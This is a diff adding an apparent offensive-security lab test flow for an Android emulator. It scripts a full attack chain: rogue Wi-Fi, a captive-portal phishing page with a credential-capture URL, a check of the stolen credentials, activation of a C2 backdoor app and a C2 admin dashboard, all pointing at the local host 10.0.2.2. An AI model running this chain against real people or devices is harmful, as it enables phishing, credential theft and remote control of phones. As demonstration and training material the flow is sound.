@@ -1,0 +1,51 @@
+name: OffSec Lab - Full Chain Attack Simulation
+appId: com.android.chrome
+tags: [offsec, rogue-ap, captive-portal, c2-agent, account-takeover]
+---
+# FULL CHAIN: Rogue AP → Captive Portal → APK Download → C2 Backdoor
+#
+# PREREQUISITES (run before this flow):
+# 1. C2 server running: python3 c2_server.py
+# 2. APK installed on emulator
+
+# ============================================================
+# PHASE 1: Victim connects to "Free Public WiFi" (Rogue AP)
+# ============================================================
+- openLink: "http://10.0.2.2:8080/"
+- takeScreenshot: phase1_captive_portal
+
+# ============================================================
+# PHASE 2: Victim enters credentials on phishing page (simulated)
+# ============================================================
+- openLink: "http://10.0.2.2:8080/capture?name=Budi%20Santoso&email=budi@company.com&phone=%2B62%20812%203456%207890"
+- takeScreenshot: phase2_credentials_captured
+
+# ============================================================
+# PHASE 3: Verify credentials captured
+# ============================================================
+- openLink: "http://10.0.2.2:8080/creds"
+- takeScreenshot: phase3_creds_admin
+
+# ============================================================
+# PHASE 4: Launch C2 Agent app (already installed)
+# ============================================================
+- launchApp:
+    appId: com.c2.agent
+- takeScreenshot: phase4_c2_agent_interface
+- assertVisible:
+    text: "START AGENT"
+- tapOn:
+    text: "START AGENT"
+- takeScreenshot: phase5_agent_activated
+
+# ============================================================
+# PHASE 5: Agent beacons to C2 - attacker has control
+# ============================================================
+- assertVisible:
+    text: ".*ACTIVE.*|.*STOP AGENT.*"
+- takeScreenshot: phase6_c2_connected
+
+# ============================================================
+# VERIFICATION: Open C2 admin dashboard
+# ============================================================
+- openLink: "http://10.0.2.2:4443/admin"
